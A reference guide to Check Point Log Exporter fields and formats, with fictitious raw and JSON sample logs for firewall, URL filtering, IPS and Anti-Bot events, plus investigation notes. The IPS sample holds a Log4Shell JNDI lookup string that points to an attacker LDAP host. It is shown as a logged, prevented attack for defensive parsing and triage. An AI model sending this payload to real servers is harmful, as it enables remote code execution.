# Check Point Quantum Security Gateway — Log Exporter output

Category: Network firewall · Vendor: Check Point · Product: Quantum Security Gateway / Management (R81.x / R82), logs exported by **Log Exporter** (`cp_log_export`)
Scope: Firewall / Access Control, URL Filtering & Application Control, Threat Prevention (IPS = `SmartDefense`, Anti-Bot).

## 1. Official sources

| Source | What it confirmed |
|---|---|
| sk144192 *Description of Fields in Check Point Logs* — https://support.checkpoint.com/results/sk/sk144192 | Field names + display names + types: `src`, `dst`, `s_port`, `service`, `service_id`, `proto`, `origin`, `product` (Blade), `rule_name`, `rule_uid`, `layer_name`, `match_id`, `parent_rule`, `inzone`/`outzone`, `xlatesrc`/`xlatedst`, `loguid`, `session_id`, `sent_bytes`/`received_bytes`, `client_outbound_bytes`, `protection_name`/`protection_type`/`protection_id`, `malware_action`, `malware_family`, `appi_name`, `app_category`, `matched_category`, `app_risk` (0 Unknown–5 Critical), `resource`, `industry_reference` (CVE), `severity` (0 Informational, 1 Low, 2 Medium, 3 High, 4 Critical), `confidence_level` (0 N/A, 1 Low, 2 Medium-Low, 3 Medium, 4 Medium-High, 5 High), `performance_impact`, `web_client_type`, `proxy_src_ip`, `action_reason` |
| Log Exporter Admin Guide, Appendix B — https://sc1.checkpoint.com/documents/Log_Exporter/EN/Content/Topics/Appendix_B_Additional_Information.htm | `loguid` = shared by all updates of one log; `hll_key` = links connection logs of one high-level session (R80.10+); supported formats (syslog default, CEF, LEEF, JSON, Splunk) |
| Log Exporter Admin Guide (PDF) — https://sc1.checkpoint.com/documents/Log_Exporter/EN/CP_Log_Exporter_AdminGuide.pdf | Exporter configuration; read-mode `semi-unified` (default) vs `raw` |
| elastic/integrations `packages/checkpoint/data_stream/firewall/_dev/test/pipeline/*.log` — https://github.com/elastic/integrations/tree/main/packages/checkpoint/data_stream/firewall/_dev/test/pipeline | Real RAW syslog lines: RFC 5424 header + `[key:"value"; …]` body; repeated keys per policy layer (`layer_name`, `rule_name`, `rule_uid`, `match_id`, `parent_rule`, `rule_action` incl. `Inline`); IPS log with `product:"SmartDefense"`, `attack`, `attack_info`, `protection_type:"IPS"`, numeric `severity:"3"`; Anti-Bot/Anti-Malware with `malware_action:"Communication with C&C site"`, `protection_type:"URL reputation"`; accounting counters `client_outbound_bytes`, `server_inbound_bytes`, `segment_time`; `tcp_packet_out_of_state` drops |

## 2. Native format & delivery

- **Wire format (default `syslog` format):** RFC 5424 header, then all fields inside one bracketed block:
  `<134>1 2026-09-30T06:14:07Z gw-hq-01 CheckPoint 26144 - [action:"Accept"; flags:"411908"; ifdir:"outbound"; …]`
  Every value is double-quoted; pairs are separated by `; `. Header time is UTC; `time` inside the body is epoch seconds.
- **Field order:** a fixed head (`action`, `flags`, `ifdir`, `ifname`, `logid`, `loguid`, `origin`, `originsicname`, `sequencenum`, `time`, `version`, `__policy_id_tag`) followed by blade-specific fields, mostly alphabetical.
- **Repeated keys:** with ordered + inline layers the "match table" fields repeat once per matched layer (`layer_name`, `layer_uuid`, `match_id`, `parent_rule`, `rule_action`, `rule_name`, `rule_uid`).
- **Log updates:** connections tracked with *Accounting* (and some Threat Prevention logs) are re-sent as their counters change — same `loguid`, higher `sequencenum`, newer `lastupdatetime`.
- Other exporter formats (CEF `cs1=…`, LEEF, JSON) rename/flatten fields — **not** used here.

**Our JSON rendering rule (platform):**
1. Flat object; keys = Check Point field names exactly (including the leading-underscore internal ones such as `__policy_id_tag` when shown).
2. **All values are strings** (they are quoted on the wire) — `"severity": "4"`, `"time": "1790748847"`.
3. A key that repeats in one record becomes a **JSON array in emitted order** (JSON cannot hold duplicate keys); index *n* of every match-table array belongs to the same layer.
4. Numeric codes stay numeric strings (`severity`, `confidence_level`, `app_risk`, `performance_impact`) — do not replace them with SmartConsole words.

## 3. Core field reference

### 3.1 Common head

| Field | Meaning | Values |
|---|---|---|
| `action` | Final action | `Accept`, `Drop`, `Reject`, `Block`, `Prevent`, `Detect`, `Ask`, `Inform`, `Bypass`, `Redirect`, `Encrypt`, `Decrypt` (depends on blade) |
| `flags` | Internal bitfield | `411908` |
| `ifdir` | Direction relative to the gateway interface | `inbound`, `outbound` |
| `ifname` | Interface | `eth0`, `bond1.2997` |
| `logid` | Log type id | `0` (regular), `6` (accounting/update), others internal |
| `loguid` | Unified log UUID `{0x…,0x…,0x…,0x…}` — the first word is the creation epoch in hex | `{0x6abca8af,0x1c,0x100014ac,0x3c8a91d2}` |
| `origin`, `originsicname` | Reporting gateway IP / SIC DN | `10.20.0.1`, `CN=gw-hq-01,O=…` |
| `sequencenum` | Sequence within the loguid | `1` |
| `time` | Epoch seconds | `1790748847` |
| `version` | Log format version | `5` |
| `product` | Blade that logged | `VPN-1 & FireWall-1`, `URL Filtering`, `Application Control`, `SmartDefense` (IPS), `Anti-Bot`, `Anti-Virus` / `New Anti Virus`, `Anti Malware` (newer), `Threat Emulation`, `Threat Extraction`, `HTTPS Inspection`, `Identity Awareness` |

### 3.2 Connection / Access Control

| Field | Meaning | Values |
|---|---|---|
| `src`, `dst` | Addresses | |
| `s_port` | Source port | `52144` |
| `service` | Destination port (numeric) | `443` |
| `service_id` | Service object name | `https`, `http`, `Remote_Desktop_Protocol`, `domain-udp` |
| `proto` | IP protocol number | `6`, `17`, `1` |
| `inzone`, `outzone` | Source/destination zone | `Internal`, `External`, `DMZ` (topology-defined) |
| `xlatesrc`, `xlatedst`, `xlatesport`, `xlatedport` | NAT values | `0.0.0.0` / `0` when not translated |
| `layer_name`, `layer_uuid`, `rule_name`, `rule_uid`, `match_id`, `parent_rule`, `rule_action` | Match table (one entry per layer) | `rule_action` ∈ `Accept`, `Drop`, `Reject`, `Inline`, `Ask`, `Inform` |
| `src_user_name`, `src_machine_name`, `user` | Identity Awareness | `dlevi`, `WS-FIN-0142` |
| `src_country`, `dst_country` | GeoIP | |
| `bytes`, `packets`, `client_outbound_bytes`, `client_inbound_bytes`, `server_inbound_bytes`, `server_outbound_bytes`, `*_packets`, `sent_bytes`, `received_bytes` | Accounting counters | strings of integers |
| `segment_time`, `start_time`, `elapsed`, `lastupdatetime`, `hll_key` | Session timing / grouping | epoch seconds |
| `reason`, `action_reason`, `tcp_flags`, `tcp_packet_out_of_state` | Drop explanations | `First packet isn't SYN` |

### 3.3 URL Filtering / Application Control

`appi_name` (application or, for URLF, the **domain only**), `app_id`, `app_category`, `matched_category`, `app_risk` (`0`–`5`), `app_desc`, `app_properties`, `resource` (full URL; SNI domain only without HTTPS Inspection), `method`, `web_client_type`, `proxy_src_ip`, `usercheck_*`. Example category names: `Uncategorized`, `Spyware / Malicious Sites`, `Phishing`, `Botnets`, `Anonymizer`, `High Risk`, `Critical Risk`, `File Storage and Sharing`.

### 3.4 Threat Prevention (IPS / Anti-Bot / AV)

| Field | Meaning | Values |
|---|---|---|
| `protection_name` | Signature/protection name | `Apache Log4j Remote Code Execution (CVE-2021-44228)` |
| `protection_type` | Detection engine | `IPS`, `anomaly`, `URL reputation`, `DNS Reputation`, `IP reputation`, `IOC`, `Signature`, `File Reputation` |
| `protection_id` | Protection identifier | |
| `attack`, `attack_info` | IPS attack class / detail | `Port Scan`, `Scanner Enforcement Violation` |
| `severity` | numeric code | `0` Informational · `1` Low · `2` Medium · `3` High · `4` Critical |
| `confidence_level` | numeric code | `0` N/A · `1` Low · `2` Medium-Low · `3` Medium · `4` Medium-High · `5` High |
| `performance_impact` | numeric code | `1`–`4` (mapping UNVERIFIED) |
| `industry_reference` | CVE | `CVE-2021-44228` |
| `malware_action`, `malware_family`, `malware_rule_id` | Anti-Bot / AV behaviour | `Communication with C&C site` |
| `policy`, `layer_name` (`Standard Threat Prevention`), `smartdefense_profile` (`Optimized`), `session_id` | Policy context | |
| `packet_capture_name`, `packet_capture_unique_id` | Attached capture | |

## 4. Realistic samples

Scenario thread (fictitious): workstation `10.20.14.37` (`WS-FIN-0142`, `dlevi`) behind hide-NAT `203.0.113.10`; DMZ server `10.30.1.15` published as `203.0.113.25`. External IPs RFC 5737; domains invented. Header time is UTC; body `time` is the matching epoch (local time +03:00).

### CP-1 - Allowed outbound HTTPS to an uncategorised domain (C2-like beacon)

URL Filtering accept through an ordered Network layer (`rule_action` `Inline`) and an inline Web Control layer (`Accept`). Without HTTPS Inspection `resource` holds only the SNI domain. `web_client_type` exposing a script client (not a browser) on a finance workstation is a strong beacon hint. Repeated keys (`layer_name`, `rule_uid`...) are one value per matched layer - rendered as JSON arrays.

**Raw (native):**

```text
<134>1 2026-09-30T06:14:07Z gw-hq-01 CheckPoint 26144 - [action:"Accept"; flags:"411908"; ifdir:"outbound"; ifname:"eth1"; logid:"0"; loguid:"{0x6abca8af,0x1c,0x100014ac,0x3c8a91d2}"; origin:"10.20.0.1"; originsicname:"CN=gw-hq-01,O=mgmt-hq.acme.local.x7k2pq"; sequencenum:"1"; time:"1790748847"; version:"5"; __policy_id_tag:"product=VPN-1 & FireWall-1[db_tag={6A1E3F52-9C0B-4D7A-B2E8-11F04C6D9A37};mgmt=mgmt-hq;date=1790661600;policy_name=Corp_Policy\]"; app_category:"Uncategorized"; app_id:"0"; app_risk:"0"; appi_name:"cdn-telemetry-sync.top"; dst:"198.51.100.77"; inzone:"Internal"; layer_name:"Network"; layer_name:"Web Control"; layer_uuid:"8f3a2c1e-5b7d-4e90-a6c2-3d1f0b9e7a54"; layer_uuid:"c27e9b40-1d3f-4a8c-9e65-7b2d0f4a1c88"; match_id:"12"; match_id:"33554433"; matched_category:"Uncategorized"; parent_rule:"0"; parent_rule:"12"; rule_action:"Inline"; rule_action:"Accept"; rule_name:"Internet Access"; rule_name:"Allow uncategorized"; rule_uid:"1b5d8e2a-7c3f-4f61-9a0e-6d4c2b8f1e37"; rule_uid:"e9a14c70-3b2d-4f85-8c61-0a7e5d9b2f13"; outzone:"External"; product:"URL Filtering"; proto:"6"; resource:"https://cdn-telemetry-sync.top"; s_port:"52144"; service:"443"; service_id:"https"; src:"10.20.14.37"; src_machine_name:"WS-FIN-0142"; src_user_name:"dlevi"; xlatesrc:"203.0.113.10"; xlatesport:"31877"; xlatedst:"0.0.0.0"; xlatedport:"0"; web_client_type:"Other: Python-urllib/3.11"]
```

**Flat JSON rendering:**

```json
{
  "action": "Accept",
  "flags": "411908",
  "ifdir": "outbound",
  "ifname": "eth1",
  "logid": "0",
  "loguid": "{0x6abca8af,0x1c,0x100014ac,0x3c8a91d2}",
  "origin": "10.20.0.1",
  "originsicname": "CN=gw-hq-01,O=mgmt-hq.acme.local.x7k2pq",
  "sequencenum": "1",
  "time": "1790748847",
  "version": "5",
  "__policy_id_tag": "product=VPN-1 & FireWall-1[db_tag={6A1E3F52-9C0B-4D7A-B2E8-11F04C6D9A37};mgmt=mgmt-hq;date=1790661600;policy_name=Corp_Policy\\]",
  "app_category": "Uncategorized",
  "app_id": "0",
  "app_risk": "0",
  "appi_name": "cdn-telemetry-sync.top",
  "dst": "198.51.100.77",
  "inzone": "Internal",
  "layer_name": [
    "Network",
    "Web Control"
  ],
  "layer_uuid": [
    "8f3a2c1e-5b7d-4e90-a6c2-3d1f0b9e7a54",
    "c27e9b40-1d3f-4a8c-9e65-7b2d0f4a1c88"
  ],
  "match_id": [
    "12",
    "33554433"
  ],
  "matched_category": "Uncategorized",
  "parent_rule": [
    "0",
    "12"
  ],
  "rule_action": [
    "Inline",
    "Accept"
  ],
  "rule_name": [
    "Internet Access",
    "Allow uncategorized"
  ],
  "rule_uid": [
    "1b5d8e2a-7c3f-4f61-9a0e-6d4c2b8f1e37",
    "e9a14c70-3b2d-4f85-8c61-0a7e5d9b2f13"
  ],
  "outzone": "External",
  "product": "URL Filtering",
  "proto": "6",
  "resource": "https://cdn-telemetry-sync.top",
  "s_port": "52144",
  "service": "443",
  "service_id": "https",
  "src": "10.20.14.37",
  "src_machine_name": "WS-FIN-0142",
  "src_user_name": "dlevi",
  "xlatesrc": "203.0.113.10",
  "xlatesport": "31877",
  "xlatedst": "0.0.0.0",
  "xlatedport": "0",
  "web_client_type": "Other: Python-urllib/3.11"
}
```

### CP-2 - Connection blocked by policy (inbound RDP probe)

Firewall blade (`product` = `VPN-1 & FireWall-1`) drop on the cleanup rule. Note there is no byte counter on a first-packet drop, and the destination port appears twice: numeric `service` and object name `service_id`.

**Raw (native):**

```text
<134>1 2026-09-30T06:32:51Z gw-hq-01 CheckPoint 26144 - [action:"Drop"; flags:"425988"; ifdir:"inbound"; ifname:"eth0"; logid:"0"; loguid:"{0x6abcad13,0x2a,0x100014ac,0x3c8a91d2}"; origin:"10.20.0.1"; originsicname:"CN=gw-hq-01,O=mgmt-hq.acme.local.x7k2pq"; sequencenum:"3"; time:"1790749971"; version:"5"; __policy_id_tag:"product=VPN-1 & FireWall-1[db_tag={6A1E3F52-9C0B-4D7A-B2E8-11F04C6D9A37};mgmt=mgmt-hq;date=1790661600;policy_name=Corp_Policy\]"; dst:"203.0.113.25"; inzone:"External"; layer_name:"Network"; layer_uuid:"8f3a2c1e-5b7d-4e90-a6c2-3d1f0b9e7a54"; match_id:"27"; parent_rule:"0"; rule_action:"Drop"; rule_name:"Cleanup rule"; rule_uid:"4d0c9e7b-2a51-4f38-b6e2-9c1a7f3d5e08"; outzone:"DMZ"; product:"VPN-1 & FireWall-1"; proto:"6"; s_port:"61022"; service:"3389"; service_id:"Remote_Desktop_Protocol"; src:"192.0.2.45"; src_country:"Netherlands"]
```

**Flat JSON rendering:**

```json
{
  "action": "Drop",
  "flags": "425988",
  "ifdir": "inbound",
  "ifname": "eth0",
  "logid": "0",
  "loguid": "{0x6abcad13,0x2a,0x100014ac,0x3c8a91d2}",
  "origin": "10.20.0.1",
  "originsicname": "CN=gw-hq-01,O=mgmt-hq.acme.local.x7k2pq",
  "sequencenum": "3",
  "time": "1790749971",
  "version": "5",
  "__policy_id_tag": "product=VPN-1 & FireWall-1[db_tag={6A1E3F52-9C0B-4D7A-B2E8-11F04C6D9A37};mgmt=mgmt-hq;date=1790661600;policy_name=Corp_Policy\\]",
  "dst": "203.0.113.25",
  "inzone": "External",
  "layer_name": "Network",
  "layer_uuid": "8f3a2c1e-5b7d-4e90-a6c2-3d1f0b9e7a54",
  "match_id": "27",
  "parent_rule": "0",
  "rule_action": "Drop",
  "rule_name": "Cleanup rule",
  "rule_uid": "4d0c9e7b-2a51-4f38-b6e2-9c1a7f3d5e08",
  "outzone": "DMZ",
  "product": "VPN-1 & FireWall-1",
  "proto": "6",
  "s_port": "61022",
  "service": "3389",
  "service_id": "Remote_Desktop_Protocol",
  "src": "192.0.2.45",
  "src_country": "Netherlands"
}
```

### CP-3 - IPS: Log4Shell exploit attempt against a DMZ server (prevented)

IPS blade - Log Exporter writes `product` = `SmartDefense` (SmartConsole shows "IPS"). `severity` and `confidence_level` are NUMERIC codes in exported logs (4 = Critical, 5 = High confidence). `industry_reference` carries the CVE. The `protection_id` value and the `attack`/`attack_info` split for this specific protection are UNVERIFIED (pattern taken from a real exported IPS log).

**Raw (native):**

```text
<134>1 2026-09-30T07:02:18Z gw-hq-01 CheckPoint 26144 - [action:"Prevent"; flags:"311552"; ifdir:"inbound"; ifname:"eth0"; logid:"0"; loguid:"{0x6abcb3fa,0x0,0x100014ac,0x3c8a91d2}"; origin:"10.20.0.1"; originsicname:"CN=gw-hq-01,O=mgmt-hq.acme.local.x7k2pq"; sequencenum:"1"; time:"1790751738"; version:"5"; __policy_id_tag:"product=VPN-1 & FireWall-1[db_tag={6A1E3F52-9C0B-4D7A-B2E8-11F04C6D9A37};mgmt=mgmt-hq;date=1790661600;policy_name=Corp_Policy\]"; attack:"Content Protection Violation"; attack_info:"Apache Log4j Remote Code Execution (CVE-2021-44228)"; confidence_level:"5"; dst:"10.30.1.15"; http_host:"portal.acme-corp.example"; industry_reference:"CVE-2021-44228"; layer_name:"Standard Threat Prevention"; layer_uuid:"{6CC286F4-87BC-412A-B231-8C63C30D978E}"; method:"POST"; performance_impact:"2"; policy:"Corp_Policy"; product:"SmartDefense"; protection_id:"asm_dynamic_prop_CVE_2021_44228"; protection_name:"Apache Log4j Remote Code Execution (CVE-2021-44228)"; protection_type:"IPS"; proto:"6"; resource:"http://portal.acme-corp.example:8080/api/login"; s_port:"44810"; service:"8080"; service_id:"webcache"; session_id:"{0x6abcb3fa,0x0,0x100014ac,0x3c8a91d2}"; severity:"4"; smartdefense_profile:"Optimized"; src:"192.0.2.88"; src_country:"Germany"; user_agent:"${jndi:ldap://192.0.2.88:1389/Exploit}"]
```

**Flat JSON rendering:**

```json
{
  "action": "Prevent",
  "flags": "311552",
  "ifdir": "inbound",
  "ifname": "eth0",
  "logid": "0",
  "loguid": "{0x6abcb3fa,0x0,0x100014ac,0x3c8a91d2}",
  "origin": "10.20.0.1",
  "originsicname": "CN=gw-hq-01,O=mgmt-hq.acme.local.x7k2pq",
  "sequencenum": "1",
  "time": "1790751738",
  "version": "5",
  "__policy_id_tag": "product=VPN-1 & FireWall-1[db_tag={6A1E3F52-9C0B-4D7A-B2E8-11F04C6D9A37};mgmt=mgmt-hq;date=1790661600;policy_name=Corp_Policy\\]",
  "attack": "Content Protection Violation",
  "attack_info": "Apache Log4j Remote Code Execution (CVE-2021-44228)",
  "confidence_level": "5",
  "dst": "10.30.1.15",
  "http_host": "portal.acme-corp.example",
  "industry_reference": "CVE-2021-44228",
  "layer_name": "Standard Threat Prevention",
  "layer_uuid": "{6CC286F4-87BC-412A-B231-8C63C30D978E}",
  "method": "POST",
  "performance_impact": "2",
  "policy": "Corp_Policy",
  "product": "SmartDefense",
  "protection_id": "asm_dynamic_prop_CVE_2021_44228",
  "protection_name": "Apache Log4j Remote Code Execution (CVE-2021-44228)",
  "protection_type": "IPS",
  "proto": "6",
  "resource": "http://portal.acme-corp.example:8080/api/login",
  "s_port": "44810",
  "service": "8080",
  "service_id": "webcache",
  "session_id": "{0x6abcb3fa,0x0,0x100014ac,0x3c8a91d2}",
  "severity": "4",
  "smartdefense_profile": "Optimized",
  "src": "192.0.2.88",
  "src_country": "Germany",
  "user_agent": "${jndi:ldap://192.0.2.88:1389/Exploit}"
}
```

### CP-4 - Anti-Bot: C2 domain resolution prevented

Anti-Bot blade on the DNS lookup for the beacon domain. `malware_action` describes behaviour, `resource` holds the malicious domain, `protection_type` tells you which reputation engine matched. In R81.20+ exports the same detection may appear with `product` = `Anti Malware` and, when a UserCheck page is shown, `action` = `Block` (seen in real samples). Protection name/ID are ILLUSTRATIVE.

**Raw (native):**

```text
<134>1 2026-09-30T06:21:09Z gw-hq-01 CheckPoint 26144 - [action:"Prevent"; flags:"311552"; ifdir:"outbound"; ifname:"eth1"; logid:"0"; loguid:"{0x6abcaa55,0x0,0x100014ac,0x3c8a91d2}"; origin:"10.20.0.1"; originsicname:"CN=gw-hq-01,O=mgmt-hq.acme.local.x7k2pq"; sequencenum:"1"; time:"1790749269"; version:"5"; __policy_id_tag:"product=VPN-1 & FireWall-1[db_tag={6A1E3F52-9C0B-4D7A-B2E8-11F04C6D9A37};mgmt=mgmt-hq;date=1790661600;policy_name=Corp_Policy\]"; confidence_level:"5"; dst:"198.51.100.77"; layer_name:"Standard Threat Prevention"; layer_uuid:"{6CC286F4-87BC-412A-B231-8C63C30D978E}"; malware_action:"Communication with C&C site"; malware_family:"CobaltStrike"; malware_rule_id:"{F50127A1-D5C9-4BAC-8C3F-2D2557E6FFAD}"; policy:"Corp_Policy"; product:"Anti-Bot"; protection_id:"0E3B1A7C2"; protection_name:"Backdoor.Win32.CobaltStrike.TC.a"; protection_type:"DNS Reputation"; proto:"17"; proxy_src_ip:"10.20.14.37"; resource:"cdn-telemetry-sync.top"; s_port:"61544"; service:"53"; service_id:"domain-udp"; session_id:"{0x6abcaa55,0x0,0x100014ac,0x3c8a91d2}"; severity:"4"; src:"10.20.14.37"; src_machine_name:"WS-FIN-0142"; src_user_name:"dlevi"]
```

**Flat JSON rendering:**

```json
{
  "action": "Prevent",
  "flags": "311552",
  "ifdir": "outbound",
  "ifname": "eth1",
  "logid": "0",
  "loguid": "{0x6abcaa55,0x0,0x100014ac,0x3c8a91d2}",
  "origin": "10.20.0.1",
  "originsicname": "CN=gw-hq-01,O=mgmt-hq.acme.local.x7k2pq",
  "sequencenum": "1",
  "time": "1790749269",
  "version": "5",
  "__policy_id_tag": "product=VPN-1 & FireWall-1[db_tag={6A1E3F52-9C0B-4D7A-B2E8-11F04C6D9A37};mgmt=mgmt-hq;date=1790661600;policy_name=Corp_Policy\\]",
  "confidence_level": "5",
  "dst": "198.51.100.77",
  "layer_name": "Standard Threat Prevention",
  "layer_uuid": "{6CC286F4-87BC-412A-B231-8C63C30D978E}",
  "malware_action": "Communication with C&C site",
  "malware_family": "CobaltStrike",
  "malware_rule_id": "{F50127A1-D5C9-4BAC-8C3F-2D2557E6FFAD}",
  "policy": "Corp_Policy",
  "product": "Anti-Bot",
  "protection_id": "0E3B1A7C2",
  "protection_name": "Backdoor.Win32.CobaltStrike.TC.a",
  "protection_type": "DNS Reputation",
  "proto": "17",
  "proxy_src_ip": "10.20.14.37",
  "resource": "cdn-telemetry-sync.top",
  "s_port": "61544",
  "service": "53",
  "service_id": "domain-udp",
  "session_id": "{0x6abcaa55,0x0,0x100014ac,0x3c8a91d2}",
  "severity": "4",
  "src": "10.20.14.37",
  "src_machine_name": "WS-FIN-0142",
  "src_user_name": "dlevi"
}
```

### CP-5 - URL Filtering block (Spyware / Malicious Sites)

URL Filtering `Block` (rule action Drop + UserCheck "Blocked Message"). `appi_name` = domain only, `resource` = full URL, `matched_category` = the category that triggered the rule. Whether a Drop rule *without* UserCheck logs `Block` or `Drop` is UNVERIFIED; `referrer` field name is UNVERIFIED.

**Raw (native):**

```text
<134>1 2026-09-30T07:47:33Z gw-hq-01 CheckPoint 26144 - [action:"Block"; flags:"411908"; ifdir:"outbound"; ifname:"eth1"; logid:"0"; loguid:"{0x6abcbe95,0x11,0x100014ac,0x3c8a91d2}"; origin:"10.20.0.1"; originsicname:"CN=gw-hq-01,O=mgmt-hq.acme.local.x7k2pq"; sequencenum:"1"; time:"1790754453"; version:"5"; __policy_id_tag:"product=VPN-1 & FireWall-1[db_tag={6A1E3F52-9C0B-4D7A-B2E8-11F04C6D9A37};mgmt=mgmt-hq;date=1790661600;policy_name=Corp_Policy\]"; app_category:"Spyware / Malicious Sites"; app_id:"0"; app_risk:"5"; appi_name:"invoice-docs-share.xyz"; dst:"198.51.100.140"; inzone:"Internal"; layer_name:"Web Control"; layer_uuid:"c27e9b40-1d3f-4a8c-9e65-7b2d0f4a1c88"; match_id:"33554436"; matched_category:"Spyware / Malicious Sites"; method:"GET"; parent_rule:"12"; rule_action:"Drop"; rule_name:"Block high-risk categories"; rule_uid:"0f6b3a9d-8e2c-4d71-a5f4-2c9e1b7d3a60"; outzone:"External"; product:"URL Filtering"; proto:"6"; proxy_src_ip:"10.20.14.37"; referrer:"http://mail-attach-preview.example/view?id=88413"; resource:"http://invoice-docs-share.xyz/dl/Invoice_8841.zip"; s_port:"53017"; service:"80"; service_id:"http"; src:"10.20.14.37"; src_machine_name:"WS-FIN-0142"; src_user_name:"dlevi"; usercheck_interaction_name:"Blocked Message - Access Control"; web_client_type:"Chrome"; xlatesrc:"203.0.113.10"; xlatesport:"22604"]
```

**Flat JSON rendering:**

```json
{
  "action": "Block",
  "flags": "411908",
  "ifdir": "outbound",
  "ifname": "eth1",
  "logid": "0",
  "loguid": "{0x6abcbe95,0x11,0x100014ac,0x3c8a91d2}",
  "origin": "10.20.0.1",
  "originsicname": "CN=gw-hq-01,O=mgmt-hq.acme.local.x7k2pq",
  "sequencenum": "1",
  "time": "1790754453",
  "version": "5",
  "__policy_id_tag": "product=VPN-1 & FireWall-1[db_tag={6A1E3F52-9C0B-4D7A-B2E8-11F04C6D9A37};mgmt=mgmt-hq;date=1790661600;policy_name=Corp_Policy\\]",
  "app_category": "Spyware / Malicious Sites",
  "app_id": "0",
  "app_risk": "5",
  "appi_name": "invoice-docs-share.xyz",
  "dst": "198.51.100.140",
  "inzone": "Internal",
  "layer_name": "Web Control",
  "layer_uuid": "c27e9b40-1d3f-4a8c-9e65-7b2d0f4a1c88",
  "match_id": "33554436",
  "matched_category": "Spyware / Malicious Sites",
  "method": "GET",
  "parent_rule": "12",
  "rule_action": "Drop",
  "rule_name": "Block high-risk categories",
  "rule_uid": "0f6b3a9d-8e2c-4d71-a5f4-2c9e1b7d3a60",
  "outzone": "External",
  "product": "URL Filtering",
  "proto": "6",
  "proxy_src_ip": "10.20.14.37",
  "referrer": "http://mail-attach-preview.example/view?id=88413",
  "resource": "http://invoice-docs-share.xyz/dl/Invoice_8841.zip",
  "s_port": "53017",
  "service": "80",
  "service_id": "http",
  "src": "10.20.14.37",
  "src_machine_name": "WS-FIN-0142",
  "src_user_name": "dlevi",
  "usercheck_interaction_name": "Blocked Message - Access Control",
  "web_client_type": "Chrome",
  "xlatesrc": "203.0.113.10",
  "xlatesport": "22604"
}
```

### CP-6 - Large outbound transfer to cloud storage (exfil-like, accounting update)

Application Control accept with **Accounting** tracking: the gateway re-emits the log with the same `loguid` as counters grow (higher `sequencenum`, newer `lastupdatetime`). `client_outbound_bytes` (client -> gateway) = upload volume. Always dedupe by `loguid` and keep the latest. App ID number and risk value for MEGA are ILLUSTRATIVE.

**Raw (native):**

```text
<134>1 2026-09-30T08:39:02Z gw-hq-01 CheckPoint 26144 - [action:"Accept"; flags:"411908"; ifdir:"outbound"; ifname:"eth1"; logid:"6"; loguid:"{0x6abcc00e,0x3f,0x100014ac,0x3c8a91d2}"; origin:"10.20.0.1"; originsicname:"CN=gw-hq-01,O=mgmt-hq.acme.local.x7k2pq"; sequencenum:"7"; time:"1790757542"; version:"5"; __policy_id_tag:"product=VPN-1 & FireWall-1[db_tag={6A1E3F52-9C0B-4D7A-B2E8-11F04C6D9A37};mgmt=mgmt-hq;date=1790661600;policy_name=Corp_Policy\]"; app_category:"File Storage and Sharing"; app_id:"60513248"; app_risk:"4"; appi_name:"MEGA"; bytes:"4882591338"; client_inbound_bytes:"51388220"; client_inbound_interface:"eth2"; client_inbound_packets:"609161"; client_outbound_bytes:"4831203118"; client_outbound_packets:"3302114"; dst:"198.51.100.201"; elapsed:"2712"; hll_key:"4417820963381025537"; inzone:"Internal"; lastupdatetime:"1790757542"; layer_name:"Network"; layer_name:"Web Control"; match_id:"12"; match_id:"33554440"; parent_rule:"0"; parent_rule:"12"; rule_action:"Inline"; rule_action:"Accept"; rule_name:"Internet Access"; rule_name:"Allow file sharing (monitor)"; outzone:"External"; packets:"3911275"; product:"Application Control"; proto:"6"; s_port:"53466"; segment_time:"1790754830"; server_inbound_bytes:"4831203118"; server_inbound_packets:"3302114"; server_outbound_bytes:"51388220"; server_outbound_interface:"eth1"; server_outbound_packets:"609161"; service:"443"; service_id:"https"; src:"10.20.14.37"; src_machine_name:"WS-FIN-0142"; src_user_name:"dlevi"; start_time:"1790754830"; xlatesrc:"203.0.113.10"; xlatesport:"18233"]
```

**Flat JSON rendering:**

```json
{
  "action": "Accept",
  "flags": "411908",
  "ifdir": "outbound",
  "ifname": "eth1",
  "logid": "6",
  "loguid": "{0x6abcc00e,0x3f,0x100014ac,0x3c8a91d2}",
  "origin": "10.20.0.1",
  "originsicname": "CN=gw-hq-01,O=mgmt-hq.acme.local.x7k2pq",
  "sequencenum": "7",
  "time": "1790757542",
  "version": "5",
  "__policy_id_tag": "product=VPN-1 & FireWall-1[db_tag={6A1E3F52-9C0B-4D7A-B2E8-11F04C6D9A37};mgmt=mgmt-hq;date=1790661600;policy_name=Corp_Policy\\]",
  "app_category": "File Storage and Sharing",
  "app_id": "60513248",
  "app_risk": "4",
  "appi_name": "MEGA",
  "bytes": "4882591338",
  "client_inbound_bytes": "51388220",
  "client_inbound_interface": "eth2",
  "client_inbound_packets": "609161",
  "client_outbound_bytes": "4831203118",
  "client_outbound_packets": "3302114",
  "dst": "198.51.100.201",
  "elapsed": "2712",
  "hll_key": "4417820963381025537",
  "inzone": "Internal",
  "lastupdatetime": "1790757542",
  "layer_name": [
    "Network",
    "Web Control"
  ],
  "match_id": [
    "12",
    "33554440"
  ],
  "parent_rule": [
    "0",
    "12"
  ],
  "rule_action": [
    "Inline",
    "Accept"
  ],
  "rule_name": [
    "Internet Access",
    "Allow file sharing (monitor)"
  ],
  "outzone": "External",
  "packets": "3911275",
  "product": "Application Control",
  "proto": "6",
  "s_port": "53466",
  "segment_time": "1790754830",
  "server_inbound_bytes": "4831203118",
  "server_inbound_packets": "3302114",
  "server_outbound_bytes": "51388220",
  "server_outbound_interface": "eth1",
  "server_outbound_packets": "609161",
  "service": "443",
  "service_id": "https",
  "src": "10.20.14.37",
  "src_machine_name": "WS-FIN-0142",
  "src_user_name": "dlevi",
  "start_time": "1790754830",
  "xlatesrc": "203.0.113.10",
  "xlatesport": "18233"
}
```


## 5. Investigation notes

- **Identity of a record:** `loguid` (all updates of the same log share it). Keep the record with the highest `sequencenum` / latest `lastupdatetime`; don't sum updates.
- **Session grouping:** `hll_key` ties several connection logs into one high-level session (e.g. one browsing session to a site). Threat Prevention logs carry `session_id`.
- **Pivot fields:** `src` / `src_user_name` / `src_machine_name` → `dst` / `appi_name` / `resource` → `rule_name` + `layer_name` (which rule in which layer) → `xlatesrc` (public egress) → `origin` (which gateway).
- **Threat triage:** read `severity` + `confidence_level` together (Critical + High = act now), then `protection_type` (reputation vs signature) and `industry_reference`.
- **Beaconing:** URLF/AppCtrl accepts for the same `appi_name` at fixed intervals, `app_category` = `Uncategorized`, `web_client_type` not a browser.
- **Exfil:** accounting counters — `client_outbound_bytes` ≫ `client_inbound_bytes`; `appi_name` in file-sharing.
